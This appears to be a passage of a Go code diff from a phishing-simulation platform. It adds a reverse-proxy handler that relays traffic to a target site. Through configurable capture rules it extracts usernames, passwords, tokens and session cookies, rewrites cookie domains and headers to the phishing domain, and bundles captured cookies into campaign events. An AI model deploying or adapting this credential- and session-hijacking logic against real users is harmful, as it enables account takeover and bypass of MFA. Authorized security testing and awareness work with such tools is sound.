+func (m *ProxyHandler) buildSessionConfig(targetDomain, phishDomain string, proxyConfig *service.ProxyServiceConfigYAML) map[string]service.ProxyServiceDomainConfig {
+	sessionConfig := map[string]service.ProxyServiceDomainConfig{
+		targetDomain: {To: phishDomain},
+	}
+
+	// Copy domain-specific proxy config
+	for originalHost, hostConfig := range proxyConfig.Hosts {
+		if hostConfig != nil {
+			sessionConfig[originalHost] = *hostConfig
+		}
+	}
+
+	// add global rules to all host configurations
+	if proxyConfig.Global != nil {
+		for originalHost := range sessionConfig {
+			hostConfig := sessionConfig[originalHost]
+			// append global capture rules
+			hostConfig.Capture = append(hostConfig.Capture, proxyConfig.Global.Capture...)
+			// append global rewrite rules
+			hostConfig.Rewrite = append(hostConfig.Rewrite, proxyConfig.Global.Rewrite...)
+			sessionConfig[originalHost] = hostConfig
+		}
+	}
+
+	return sessionConfig
+}
+
+func (m *ProxyHandler) initializeSession(session *ProxySession, sessionConfig map[string]service.ProxyServiceDomainConfig) {
+	// store configuration in sync.map
+	for host, config := range sessionConfig {
+		session.Config.Store(host, config)
+	}
+
+	// initialize atomic values
+	session.IsComplete.Store(false)
+	session.CookieBundleSubmitted.Store(false)
+	session.NextPageType.Store("")
+
+	// initialize required captures
+	m.initializeRequiredCaptures(session)
+}
+
+func (m *ProxyHandler) findSessionByCampaignRecipient(campaignRecipientID *uuid.UUID) string {
+	if campaignRecipientID == nil {
+		return ""
+	}
+
+	sessionIDVal, exists := m.campaignRecipientSessions.Load(campaignRecipientID.String())
+	if !exists {
+		return ""
+	}
+
+	sessionID := sessionIDVal.(string)
+	if sessionVal, sessionExists := m.sessions.Load(sessionID); sessionExists {
+		if _, ok := sessionVal.(*ProxySession); ok {
+			return sessionID
+		}
+	}
+
+	// cleanup orphaned mapping
+	m.campaignRecipientSessions.Delete(campaignRecipientID.String())
+	return ""
+}
+
+func (m *ProxyHandler) initializeRequiredCaptures(session *ProxySession) {
+	session.Config.Range(func(key, value interface{}) bool {
+		hostConfig := value.(service.ProxyServiceDomainConfig)
+		for _, capture := range hostConfig.Capture {
+			if capture.Required == nil || *capture.Required {
+				session.RequiredCaptures.Store(capture.Name, false)
+			}
+		}
+		return true
+	})
+}
+
+func (m *ProxyHandler) onRequestBody(req *http.Request, session *ProxySession) {
+	hostConfigInterface, exists := session.Config.Load(req.Host)
+	if !exists || req.Body == nil {
+		return
+	}
+
+	hostConfig := hostConfigInterface.(service.ProxyServiceDomainConfig)
+	body := m.readRequestBody(req)
+
+	for _, capture := range hostConfig.Capture {
+		if m.shouldApplyCaptureRule(capture, "request_body", req) {
+			m.captureFromText(string(body), capture, session, req, "request_body")
+		}
+	}
+
+	m.applyRequestBodyReplacements(req, session)
+}
+
+func (m *ProxyHandler) onRequestHeader(req *http.Request, session *ProxySession) {
+	hostConfigInterface, exists := session.Config.Load(req.Host)
+	if !exists {
+		return
+	}
+
+	hostConfig := hostConfigInterface.(service.ProxyServiceDomainConfig)
+	var buf bytes.Buffer
+	req.Header.Write(&buf)
+
+	for _, capture := range hostConfig.Capture {
+		if m.shouldApplyCaptureRule(capture, "request_header", req) {
+			m.captureFromText(buf.String(), capture, session, req, "request_header")
+		}
+	}
+}
+
+func (m *ProxyHandler) onResponseBody(resp *http.Response, body []byte, session *ProxySession) {
+	originalHost := resp.Request.Host
+	if originalHost == "" {
+		originalHost = session.TargetDomain
+	}
+
+	hostConfigInterface, exists := session.Config.Load(originalHost)
+	if !exists {
+		return
+	}
+
+	hostConfig := hostConfigInterface.(service.ProxyServiceDomainConfig)
+
+	for _, capture := range hostConfig.Capture {
+		if m.shouldProcessResponseBodyCapture(capture, resp.Request) {
+			if capture.Find == "" {
+				m.handlePathBasedCapture(capture, session, resp)
+			} else {
+				m.captureFromText(string(body), capture, session, resp.Request, "response_body")
+			}
+		}
+	}
+}
+
+func (m *ProxyHandler) onResponseCookies(resp *http.Response, session *ProxySession) {
+	hostConfigInterface, exists := session.Config.Load(resp.Request.Host)
+	if !exists {
+		return
+	}
+
+	hostConfig := hostConfigInterface.(service.ProxyServiceDomainConfig)
+	cookies := resp.Cookies()
+	if len(cookies) == 0 {
+		return
+	}
+
+	capturedCookies := make(map[string]map[string]string)
+
+	for _, capture := range hostConfig.Capture {
+		if capture.From == "cookie" && m.matchesPath(capture, resp.Request) {
+			if cookieData := m.extractCookieData(capture, cookies, resp); cookieData != nil {
+				capturedCookies[capture.Name] = cookieData
+				// always overwrite cookie data to ensure we have the latest cookies
+				// this is important for scenarios like failed login -> successful login
+				session.CapturedData.Store(capture.Name, cookieData)
+				m.checkCaptureCompletion(session, capture.Name)
+				// reset cookie bundle submitted flag since we have new cookie data
+				// this allows resubmission with the latest cookies after all captures complete
+				session.CookieBundleSubmitted.Store(false)
+			}
+		}
+	}
+
+	if len(capturedCookies) > 0 {
+		m.handleCampaignFlowProgression(session, resp.Request)
+	}
+
+	m.checkAndSubmitCookieBundleWhenComplete(session, resp.Request)
+}
+
+func (m *ProxyHandler) onResponseHeader(resp *http.Response, session *ProxySession) {
+	hostConfigInterface, exists := session.Config.Load(resp.Request.Host)
+	if !exists {
+		return
+	}
+
+	hostConfig := hostConfigInterface.(service.ProxyServiceDomainConfig)
+	var buf bytes.Buffer
+	resp.Header.Write(&buf)
+
+	for _, capture := range hostConfig.Capture {
+		if m.shouldApplyCaptureRule(capture, "response_header", resp.Request) {
+			m.captureFromText(buf.String(), capture, session, resp.Request, "response_header")
+			m.handleImmediateCampaignRedirect(session, resp, resp.Request, "response_header")
+		}
+	}
+}
+
+func (m *ProxyHandler) shouldApplyCaptureRule(capture service.ProxyServiceCaptureRule, captureType string, req *http.Request) bool {
+	// check capture source
+	if capture.From != "" && capture.From != captureType && capture.From != "any" {
+		return false
+	}
+
+	// check method
+	if capture.Method != "" && capture.Method != req.Method {
+		return false
+	}
+
+	// check path
+	return m.matchesPath(capture, req)
+}
+
+func (m *ProxyHandler) shouldProcessResponseBodyCapture(capture service.ProxyServiceCaptureRule, req *http.Request) bool {
+	// handle path-based captures
+	if capture.Path != "" && (capture.Method == "" || capture.Method == req.Method) {
+		return m.matchesPath(capture, req)
+	}
+
+	// handle regular response body captures
+	return m.shouldApplyCaptureRule(capture, "response_body", req)
+}
+
+func (m *ProxyHandler) matchesPath(capture service.ProxyServiceCaptureRule, req *http.Request) bool {
+	if capture.PathRe == nil {
+		return true
+	}
+	return capture.PathRe.MatchString(req.URL.Path)
+}
+
+func (m *ProxyHandler) handlePathBasedCapture(capture service.ProxyServiceCaptureRule, session *ProxySession, resp *http.Response) {
+	// only mark as complete if path AND method match exactly
+	methodMatches := capture.Method == "" || capture.Method == resp.Request.Method
+	pathMatches := m.matchesPath(capture, resp.Request)
+
+	if methodMatches && pathMatches {
+		// store captured data before marking complete
+		capturedData := map[string]string{
+			"navigation_path": resp.Request.URL.Path,
+			"capture_type":    "navigation",
+		}
+		session.CapturedData.Store(capture.Name, capturedData)
+		m.checkCaptureCompletion(session, capture.Name)
+
+		if session.CampaignRecipientID != nil && session.CampaignID != nil {
+			m.createCampaignSubmitEvent(session, capturedData, resp.Request)
+		}
+
+		// check if cookie bundle should be submitted now that this capture is complete
+		m.checkAndSubmitCookieBundleWhenComplete(session, resp.Request)
+	}
+
+	m.handleImmediateCampaignRedirect(session, resp, resp.Request, "path_navigation")
+}
+
+func (m *ProxyHandler) extractCookieData(capture service.ProxyServiceCaptureRule, cookies []*http.Cookie, resp *http.Response) map[string]string {
+	cookieName := capture.Find
+	if cookieName == "" {
+		return nil
+	}
+
+	for _, cookie := range cookies {
+		if cookie.Name == cookieName {
+			return m.buildCookieData(cookie, resp)
+		}
+	}
+	return nil
+}
+
+func (m *ProxyHandler) buildCookieData(cookie *http.Cookie, resp *http.Response) map[string]string {
+	cookieDomain := cookie.Domain
+	if cookieDomain == "" {
+		cookieDomain = resp.Request.Host
+	}
+
+	isSecure := cookie.Secure
+	if resp.Request.URL.Scheme == "https" && !isSecure {
+		isSecure = true
+	}
+
+	cookieData := map[string]string{
+		"name":         cookie.Name,
+		"value":        cookie.Value,
+		"domain":       cookieDomain,
+		"path":         cookie.Path,
+		"capture_time": time.Now().Format(time.RFC3339),
+	}
+
+	if isSecure {
+		cookieData["secure"] = "true"
+	}
+	if cookie.HttpOnly {
+		cookieData["httpOnly"] = "true"
+	}
+	if cookie.SameSite != http.SameSiteDefaultMode {
+		cookieData["sameSite"] = m.sameSiteToString(cookie.SameSite)
+	}
+	if !cookie.Expires.IsZero() && cookie.Expires.Year() > 1 {
+		cookieData["expires"] = cookie.Expires.Format(time.RFC3339)
+	}
+	if cookie.MaxAge > 0 {
+		cookieData["maxAge"] = fmt.Sprintf("%d", cookie.MaxAge)
+	}
+	if resp.Request.Host != cookieDomain {
+		cookieData["original_host"] = resp.Request.Host
+	}
+
+	return cookieData
+}
+
+func (m *ProxyHandler) readRequestBody(req *http.Request) []byte {
+	body, err := io.ReadAll(req.Body)
+	if err != nil {
+		m.logger.Errorw("failed to read request body", "error", err)
+		return nil
+	}
+	req.Body.Close()
+	req.Body = io.NopCloser(bytes.NewBuffer(body))
+	return body
+}
+
+func (m *ProxyHandler) captureFromText(text string, capture service.ProxyServiceCaptureRule, session *ProxySession, req *http.Request, captureContext string) {
+	if capture.Find == "" {
+		return
+	}
+
+	re, err := regexp.Compile(capture.Find)
+	if err != nil {
+		m.logger.Errorw("invalid capture regex", "error", err, "pattern", capture.Find)
+		return
+	}
+
+	matches := re.FindStringSubmatch(text)
+	if len(matches) == 0 {
+		return
+	}
+
+	capturedData := m.buildCapturedData(matches, capture, session, req, captureContext)
+	session.CapturedData.Store(capture.Name, capturedData)
+	m.checkCaptureCompletion(session, capture.Name)
+
+	// submit non-cookie captures immediately
+	if capture.From != "cookie" && session.CampaignRecipientID != nil && session.CampaignID != nil {
+		m.createCampaignSubmitEvent(session, capturedData, req)
+	}
+
+	// check if we should submit cookie bundle (only when all captures complete)
+	m.checkAndSubmitCookieBundleWhenComplete(session, req)
+	m.handleCampaignFlowProgression(session, req)
+}
+
+func (m *ProxyHandler) buildCapturedData(matches []string, capture service.ProxyServiceCaptureRule, session *ProxySession, req *http.Request, captureContext string) map[string]string {
+	capturedData := make(map[string]string)
+
+	// add capture name to the captured data
+	capturedData["capture_name"] = capture.Name
+
+	if len(matches) > 1 {
+		for i := 1; i < len(matches); i++ {
+			capturedData[fmt.Sprintf("group_%d", i)] = matches[i]
+		}
+		m.formatCapturedData(capturedData, capture, matches, session, req, captureContext)
+	} else {
+		capturedData["matched"] = matches[0]
+	}
+
+	return capturedData
+}
+
+func (m *ProxyHandler) formatCapturedData(capturedData map[string]string, capture service.ProxyServiceCaptureRule, matches []string, session *ProxySession, req *http.Request, captureContext string) {
+	captureName := strings.ToLower(capture.Name)
+
+	switch {
+	case strings.Contains(captureName, "credential") || strings.Contains(captureName, "login"):
+		if len(matches) >= 3 {
+			capturedData["username"] = matches[1]
+			capturedData["password"] = matches[2]
+		}
+	case capture.From == "cookie":
+		if len(matches) >= 2 {
+			capturedData["cookie_value"] = matches[1]
+			domain := session.TargetDomain
+			if captureContext != "response_header" && captureContext != "response_body" {
+				domain = req.Host
+			}
+			if domain != "" {
+				capturedData["cookie_domain"] = domain
+			}
+		}
+	case strings.Contains(captureName, "token"):
+		if len(matches) >= 2 {
+			capturedData["token_value"] = matches[1]
+			capturedData["token_type"] = capture.Name
+		}
+	}
+}
+
+func (m *ProxyHandler) checkCaptureCompletion(session *ProxySession, captureName string) {
+	if _, exists := session.RequiredCaptures.Load(captureName); exists {
+		// only mark as complete if we actually have captured data for this capture
+		if _, hasData := session.CapturedData.Load(captureName); hasData {
+			session.RequiredCaptures.Store(captureName, true)
+
+			// check if all required captures are complete
+			allComplete := true
+			session.RequiredCaptures.Range(func(key, value interface{}) bool {
+				if !value.(bool) {
+					allComplete = false
+					return false
+				}
+				return true
+			})
+			session.IsComplete.Store(allComplete)
+		}
+	}
+}
+
+func (m *ProxyHandler) checkAndSubmitCookieBundleWhenComplete(session *ProxySession, req *http.Request) {
+	if session.CampaignRecipientID == nil || session.CampaignID == nil {
+		return
+	}
+
+	if session.CookieBundleSubmitted.Load() {
+		return
+	}
+
+	// only submit cookie bundle when ALL captures (including non-cookie ones) are complete
+	// this ensures we capture the final state after all authentication attempts
+	if !session.IsComplete.Load() {
+		return
+	}
+
+	// submit cookie bundle if there are cookie captures
+	cookieCaptures, requiredCookieCaptures := m.collectCookieCaptures(session)
+	if m.areAllCookieCapturesComplete(requiredCookieCaptures) && len(cookieCaptures) > 0 {
+		bundledData := m.createCookieBundle(cookieCaptures, session)
+		m.createCampaignSubmitEvent(session, bundledData, req)
+		session.CookieBundleSubmitted.Store(true)
+	}
+}
+
+func (m *ProxyHandler) collectCookieCaptures(session *ProxySession) (map[string]map[string]string, map[string]bool) {
+	cookieCaptures := make(map[string]map[string]string)
+	requiredCookieCaptures := make(map[string]bool)
+
+	session.RequiredCaptures.Range(func(requiredCaptureKey, requiredCaptureValue interface{}) bool {
+		requiredCaptureName := requiredCaptureKey.(string)
+		isComplete := requiredCaptureValue.(bool)
+
+		session.Config.Range(func(hostKey, hostValue interface{}) bool {
+			hostConfig := hostValue.(service.ProxyServiceDomainConfig)
+			for _, capture := range hostConfig.Capture {
+				if capture.Name == requiredCaptureName && capture.From == "cookie" {
+					requiredCookieCaptures[requiredCaptureName] = isComplete
+					if capturedDataInterface, exists := session.CapturedData.Load(requiredCaptureName); exists {
+						cookieCaptures[requiredCaptureName] = capturedDataInterface.(map[string]string)
+					}
+					return false
+				}
+			}
+			return true
+		})
+		return true
+	})
+
+	return cookieCaptures, requiredCookieCaptures
+}
+
+func (m *ProxyHandler) areAllCookieCapturesComplete(requiredCookieCaptures map[string]bool) bool {
+	if len(requiredCookieCaptures) == 0 {
+		return false
+	}
+
+	for _, isComplete := range requiredCookieCaptures {
+		if !isComplete {
+			return false
+		}
+	}
+	return true
+}
+
+func (m *ProxyHandler) createCookieBundle(cookieCaptures map[string]map[string]string, session *ProxySession) map[string]interface{} {
+	bundledData := map[string]interface{}{
+		"capture_type":     "cookie",
+		"cookie_count":     len(cookieCaptures),
+		"bundle_time":      time.Now().Format(time.RFC3339),
+		"target_domain":    session.TargetDomain,
+		"session_complete": true,
+		"cookies":          make(map[string]interface{}),
+	}
+
+	cookies := bundledData["cookies"].(map[string]interface{})
+	for captureName, cookieData := range cookieCaptures {
+		cookies[captureName] = cookieData
+	}
+
+	return bundledData
+}
+
+func (m *ProxyHandler) applyRequestBodyReplacements(req *http.Request, session *ProxySession) {
+	if req.Body == nil {
+		return
+	}
+
+	body := m.readRequestBody(req)
+
+	session.Config.Range(func(key, value interface{}) bool {
+		hostConfig := value.(service.ProxyServiceDomainConfig)
+		for _, replacement := range hostConfig.Rewrite {
+			if replacement.From == "" || replacement.From == "request_body" {
+				body = m.applyReplacement(body, replacement, session.ID)
+			}
+		}
+		return true
+	})
+
+	req.Body = io.NopCloser(bytes.NewBuffer(body))
+}
+
+func (m *ProxyHandler) applyCustomReplacements(body []byte, session *ProxySession) []byte {
+	session.Config.Range(func(key, value interface{}) bool {
+		hostConfig := value.(service.ProxyServiceDomainConfig)
+		for _, replacement := range hostConfig.Rewrite {
+			if replacement.From == "" || replacement.From == "response_body" {
+				body = m.applyReplacement(body, replacement, session.ID)
+			}
+		}
+		return true
+	})
+	return body
+}
+
+// applyCustomReplacementsWithoutSession applies rewrite rules for requests without session context
+func (m *ProxyHandler) applyCustomReplacementsWithoutSession(body []byte, config map[string]service.ProxyServiceDomainConfig, targetDomain string) []byte {
+	// apply rewrite rules from all host configurations (matches session behavior)
+	for _, hostConfig := range config {
+		for _, replacement := range hostConfig.Rewrite {
+			if replacement.From == "" || replacement.From == "response_body" {
+				body = m.applyReplacement(body, replacement, "no-session")
+			}
+		}
+	}
+
+	return body
+}
+
+func (m *ProxyHandler) applyReplacement(body []byte, replacement service.ProxyServiceReplaceRule, sessionID string) []byte {
+	re, err := regexp.Compile(replacement.Find)
+	if err != nil {
+		m.logger.Errorw("invalid replacement regex", "error", err)
+		return body
+	}
+
+	oldContent := string(body)
+	content := re.ReplaceAllString(oldContent, replacement.Replace)
+	if content != oldContent {
+		return []byte(content)
+	}
+	return body
+}
+
+func (m *ProxyHandler) processCookiesForPhishingDomain(resp *http.Response, ps *ProxySession) {
+	cookies := resp.Cookies()
+	if len(cookies) == 0 {
+		return
+	}
+
+	phishDomain := ps.Domain.Name
+	targetDomain, err := m.getTargetDomainForPhishingDomain(phishDomain)
+	if err != nil {
+		m.logger.Errorw("failed to get target domain for cookie processing", "error", err, "phishDomain", phishDomain)
+		return
+	}
+
+	tempConfig := map[string]service.ProxyServiceDomainConfig{
+		targetDomain: {To: phishDomain},
+	}
+
+	resp.Header.Del("Set-Cookie")
+	for _, ck := range cookies {
+		m.adjustCookieSettings(ck, nil, resp)
+		m.rewriteCookieDomain(ck, tempConfig, resp)
+		resp.Header.Add("Set-Cookie", ck.String())
+	}
+}
+
+func (m *ProxyHandler) adjustCookieSettings(ck *http.Cookie, session *ProxySession, resp *http.Response) {
+	if ck.Secure {
+		ck.SameSite = http.SameSiteNoneMode
+	} else if ck.SameSite == http.SameSiteDefaultMode {
+		ck.SameSite = http.SameSiteLaxMode
+	}
+
+	// handle cookie expiration parsing
+	if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
+		if exptime, err := time.Parse(time.RFC850, ck.RawExpires); err == nil {
+			ck.Expires = exptime
+		} else if exptime, err := time.Parse(time.ANSIC, ck.RawExpires); err == nil {
+			ck.Expires = exptime
+		} else if exptime, err := time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires); err == nil {
+			ck.Expires = exptime
+		}
+	}
+}
+
+func (m *ProxyHandler) rewriteCookieDomain(ck *http.Cookie, config map[string]service.ProxyServiceDomainConfig, resp *http.Response) {
+	cDomain := ck.Domain
+	if cDomain == "" {
+		cDomain = resp.Request.Host
+	} else if cDomain[0] != '.' {
+		cDomain = "." + cDomain
+	}
+
+	if phishHost := m.replaceHostWithPhished(strings.TrimPrefix(cDomain, "."), config); phishHost != "" {
+		if strings.HasPrefix(cDomain, ".") {
+			ck.Domain = "." + phishHost
+		} else {
+			ck.Domain = phishHost
+		}
+	} else {
+		ck.Domain = cDomain
+	}
+}
+
+func (m *ProxyHandler) sameSiteToString(sameSite http.SameSite) string {
+	switch sameSite {
+	case http.SameSiteDefaultMode:
+		return "Default"
+	case http.SameSiteLaxMode:
+		return "Lax"
+	case http.SameSiteStrictMode:
+		return "Strict"
+	case http.SameSiteNoneMode:
+		return "None"
+	default:
+		return fmt.Sprintf("Unknown(%d)", int(sameSite))
+	}
+}
+
+func (m *ProxyHandler) getCampaignRecipientIDFromURLParams(req *http.Request) (*uuid.UUID, string) {
+	ctx := req.Context()
+
+	campaignRecipient, paramName, err := server.GetCampaignRecipientFromURLParams(
+		ctx,
+		req,
+		m.IdentifierRepository,
+		m.CampaignRecipientRepository,
+	)
+	if err != nil {
+		m.logger.Errorw("failed to get identifiers for URL param extraction", "error", err)
+		return nil, ""
+	}
+
+	if campaignRecipient == nil {
+		return nil, ""
+	}
+
+	campaignRecipientID := campaignRecipient.ID.MustGet()
+	return &campaignRecipientID, paramName
+}
+
+// Header normalization methods
+func (m *ProxyHandler) normalizeRequestHeaders(req *http.Request, session *ProxySession) {
+	configMap := m.configToMap(&session.Config)
+
+	// fix origin header
+	if origin := req.Header.Get("Origin"); origin != "" {
+		if oURL, err := url.Parse(origin); err == nil {
+			if rHost := m.replaceHostWithOriginal(oURL.Host, configMap); rHost != "" {
+				oURL.Host = rHost
+				req.Header.Set("Origin", oURL.String())
+			}
+		}
+	}
+
+	// fix referer header
+	if referer := req.Header.Get("Referer"); referer != "" {
+		if rURL, err := url.Parse(referer); err == nil {
+			if rHost := m.replaceHostWithOriginal(rURL.Host, configMap); rHost != "" {
+				rURL.Host = rHost
+				req.Header.Set("Referer", rURL.String())
+			}
+		}
+	}
+
+	// prevent caching and fix headers
+	req.Header.Set("Cache-Control", "no-cache")
+
+	if secFetchDest := req.Header.Get("Sec-Fetch-Dest"); secFetchDest == "iframe" {
+		req.Header.Set("Sec-Fetch-Dest", "document")
+	}
+
+	if req.Body != nil && (req.Method == "POST" || req.Method == "PUT" || req.Method == "PATCH") {
+		if req.Header.Get("Content-Length") == "" && req.ContentLength > 0 {
+			req.Header.Set("Content-Length", fmt.Sprintf("%d", req.ContentLength))
+		}
+	}
+}
+
+func (m *ProxyHandler) readAndDecompressBody(resp *http.Response) ([]byte, bool, error) {
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, false, err
+	}
+
+	encoding := resp.Header.Get("Content-Encoding")
+	switch strings.ToLower(encoding) {
+	case "gzip":
+		gzipReader, err := gzip.NewReader(bytes.NewBuffer(body))
+		if err != nil {
+			return body, false, err
+		}
+		defer gzipReader.Close()
+		decompressed, err := io.ReadAll(gzipReader)
+		if err != nil {
+			return body, false, err
+		}
+		return decompressed, true, nil
+	case "deflate":
+		deflateReader := flate.NewReader(bytes.NewBuffer(body))
+		defer deflateReader.Close()
+		decompressed, err := io.ReadAll(deflateReader)
+		if err != nil {
+			return body, false, err
+		}
+		return decompressed, true, nil
+	case "br":
+		return body, false, nil
+	default:
+		return body, false, nil
+	}
+}
+
+func (m *ProxyHandler) updateResponseBody(resp *http.Response, body []byte, wasCompressed bool) {
+	if wasCompressed {
+		encoding := resp.Header.Get("Content-Encoding")
+		switch strings.ToLower(encoding) {
+		case "gzip":
+			var compressedBuffer bytes.Buffer
+			gzipWriter := gzip.NewWriter(&compressedBuffer)
+			if _, err := gzipWriter.Write(body); err != nil {
+				m.logger.Errorw("failed to write gzip compressed body", "error", err)
+			}
+			if err := gzipWriter.Close(); err != nil {
+				m.logger.Errorw("failed to close gzip writer", "error", err)
+			}
+			body = compressedBuffer.Bytes()
+		case "deflate":
+			var compressedBuffer bytes.Buffer
+			deflateWriter, err := flate.NewWriter(&compressedBuffer, flate.DefaultCompression)
+			if err != nil {
+				m.logger.Errorw("failed to create deflate writer", "error", err)
+				break
+			}
+			if _, err := deflateWriter.Write(body); err != nil {
+				m.logger.Errorw("failed to write deflate compressed body", "error", err)
+			}
+			if err := deflateWriter.Close(); err != nil {
+				m.logger.Errorw("failed to close deflate writer", "error", err)
+			}
+			body = compressedBuffer.Bytes()
+		}
+	}
+
+	resp.Body = io.NopCloser(bytes.NewReader(body))
+	resp.ContentLength = int64(len(body))
+	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
+}
+
+func (m *ProxyHandler) shouldProcessContent(contentType string) bool {
+	processTypes := []string{"text/html", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "application/json"}
+	for _, pType := range processTypes {
+		if strings.Contains(contentType, pType) {
+			return true
+		}
+	}
+	return false
+}
+
+func (m *ProxyHandler) handleImmediateCampaignRedirect(session *ProxySession, resp *http.Response, req *http.Request, captureLocation string) {
+	m.handleCampaignFlowProgression(session, req)
+
+	nextPageType := session.NextPageType.Load().(string)
+	if nextPageType == "" {
+		return
+	}
+
+	redirectURL := m.buildCampaignFlowRedirectURL(session, nextPageType)
+	if redirectURL == "" {
+		return
+	}
+
+	resp.StatusCode = 302
+	resp.Status = "302 Found"
+	resp.Header.Set("Location", redirectURL)
+	resp.Header.Set("Content-Length", "0")
+	resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+	resp.Body = io.NopCloser(bytes.NewReader([]byte{}))
+	session.NextPageType.Store("")
+}
+
+func (m *ProxyHandler) handleCampaignFlowProgression(session *ProxySession, req *http.Request) {
+	if session.CampaignRecipientID == nil || session.CampaignID == nil {
+		return
+	}
+
+	ctx := req.Context()
+	templateID, err := session.Campaign.TemplateID.Get()
+	if err != nil {
+		m.logger.Errorw("failed to get template ID for campaign flow progression", "error", err)
+		return
+	}
+
+	cTemplate, err := m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{})
+	if err != nil {
+		m.logger.Errorw("failed to get campaign template for flow progression", "error", err, "templateID", templateID)
+		return
+	}
+
+	currentPageType := m.getCurrentPageType(req, cTemplate, session)
+	nextPageType := m.getNextPageType(currentPageType, cTemplate)
+
+	if nextPageType != data.PAGE_TYPE_DONE && nextPageType != currentPageType && session.IsComplete.Load() {
+		session.NextPageType.Store(nextPageType)
+	}
+}
+
+func (m *ProxyHandler) getCurrentPageType(req *http.Request, template *model.CampaignTemplate, session *ProxySession) string {
+	if template.StateIdentifier != nil {
+		stateParamKey := template.StateIdentifier.Name.MustGet()
+		encryptedParam := req.URL.Query().Get(stateParamKey)
+		if encryptedParam != "" && session.CampaignID != nil {
+			secret := utils.UUIDToSecret(session.CampaignID)
+			if decrypted, err := utils.Decrypt(encryptedParam, secret); err == nil {
+				return decrypted
+			}
+		}
+	}
+
+	if template.URLIdentifier != nil {
+		urlParamKey := template.URLIdentifier.Name.MustGet()
+		campaignRecipientIDParam := req.URL.Query().Get(urlParamKey)
+		if campaignRecipientIDParam != "" {
+			if _, errPage := template.BeforeLandingPageID.Get(); errPage == nil {
+				return data.PAGE_TYPE_BEFORE
+			}
+			if _, errProxy := template.BeforeLandingProxyID.Get(); errProxy == nil {
+				return data.PAGE_TYPE_BEFORE
+			}
+			return data.PAGE_TYPE_LANDING
+		}
+	}
+
+	return data.PAGE_TYPE_LANDING
+}
+
+func (m *ProxyHandler) getNextPageType(currentPageType string, template *model.CampaignTemplate) string {
+	switch currentPageType {
+	case data.PAGE_TYPE_BEFORE:
+		return data.PAGE_TYPE_LANDING
+	case data.PAGE_TYPE_LANDING:
+		if _, errPage := template.AfterLandingPageID.Get(); errPage == nil {
+			return data.PAGE_TYPE_AFTER
+		}
+		if _, errProxy := template.AfterLandingProxyID.Get(); errProxy == nil {
+			return data.PAGE_TYPE_AFTER
+		}
+		return data.PAGE_TYPE_DONE
+	case data.PAGE_TYPE_AFTER:
+		return data.PAGE_TYPE_DONE
+	default:
+		return data.PAGE_TYPE_DONE
+	}
+}
+
+func (m *ProxyHandler) shouldRedirectForCampaignFlow(session *ProxySession, req *http.Request) bool {
+	nextPageTypeStr := session.NextPageType.Load().(string)
+	return nextPageTypeStr != "" && nextPageTypeStr != data.PAGE_TYPE_DONE && session.IsComplete.Load()
+}
+
+func (m *ProxyHandler) createCampaignFlowRedirect(session *ProxySession, resp *http.Response) *http.Response {
+	if resp == nil {
+		return nil
+	}
+
+	nextPageTypeStr := session.NextPageType.Load().(string)
+	session.NextPageType.Store("")
+
+	redirectURL := m.buildCampaignFlowRedirectURL(session, nextPageTypeStr)
+	if redirectURL == "" {
+		return resp
+	}
+
+	redirectResp := &http.Response{
+		Status:     "302 Found",
+		StatusCode: 302,
+		Proto:      resp.Proto,
+		ProtoMajor: resp.ProtoMajor,
+		ProtoMinor: resp.ProtoMinor,
+		Header:     make(http.Header),
+		Body:       io.NopCloser(bytes.NewReader([]byte{})),
+		Request:    resp.Request,
+	}
+
+	redirectResp.Header.Set("Location", redirectURL)
+	redirectResp.Header.Set("Content-Length", "0")
+
+	return redirectResp
+}
+
+func (m *ProxyHandler) buildCampaignFlowRedirectURL(session *ProxySession, nextPageType string) string {
+	if session.CampaignRecipientID == nil || session.Campaign == nil {
+		return ""
+	}
+
+	templateID, err := session.Campaign.TemplateID.Get()
+	if err != nil {
+		m.logger.Errorw("failed to get template ID for redirect URL", "error", err)
+		return ""
+	}
+
+	ctx := context.Background()
+	cTemplate, err := m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{
+		WithDomain:     true,
+		WithIdentifier: true,
+	})
+	if err != nil {
+		m.logger.Errorw("failed to get campaign template for redirect URL", "error", err, "templateID", templateID)
+		return ""
+	}
+
+	var targetURL string
+	var usesTemplateDomain bool
+
+	switch nextPageType {
+	case data.PAGE_TYPE_LANDING:
+		if _, err := cTemplate.LandingPageID.Get(); err == nil {
+			usesTemplateDomain = true
+		}
+	case data.PAGE_TYPE_AFTER:
+		if _, err := cTemplate.AfterLandingPageID.Get(); err == nil {
+			usesTemplateDomain = true
+		}
+	default:
+		if redirectURL, err := cTemplate.AfterLandingPageRedirectURL.Get(); err == nil {
+			if url := redirectURL.String(); len(url) > 0 {
+				return url
+			}
+		}
+	}
+
+	if usesTemplateDomain && cTemplate.Domain != nil {
+		domainName, err := cTemplate.Domain.Name.Get()
+		if err != nil {
+			m.logger.Errorw("failed to get domain name for redirect URL", "error", err)
+			return ""
+		}
+
+		if urlPath, err := cTemplate.URLPath.Get(); err == nil {
+			targetURL = fmt.Sprintf("https://%s%s", domainName, urlPath.String())
+		} else {
+			targetURL = fmt.Sprintf("https://%s/", domainName)
+		}
+	} else if session.Domain != nil {
+		targetURL = fmt.Sprintf("https://%s/", session.Domain.Name)
+	}
+
+	if targetURL == "" {
+		return ""
+	}
+
+	// add campaign parameters
+	if cTemplate.URLIdentifier != nil && cTemplate.StateIdentifier != nil {
+		urlParamKey := cTemplate.URLIdentifier.Name.MustGet()
+		stateParamKey := cTemplate.StateIdentifier.Name.MustGet()
+		secret := utils.UUIDToSecret(session.CampaignID)
+		encryptedPageType, err := utils.Encrypt(nextPageType, secret)
+		if err != nil {
+			m.logger.Errorw("failed to encrypt page type for redirect URL", "error", err, "pageType", nextPageType)
+			return ""
+		}
+		separator := "?"
+		if strings.Contains(targetURL, "?") {
+			separator = "&"
+		}
+
+		targetURL = fmt.Sprintf("%s%s%s=%s&%s=%s",
+			targetURL, separator, urlParamKey, session.CampaignRecipientID.String(),
+			stateParamKey, encryptedPageType,
+		)
+	}
+
+	return targetURL
+}
+
+func (m *ProxyHandler) createCampaignSubmitEvent(session *ProxySession, capturedData interface{}, req *http.Request) {
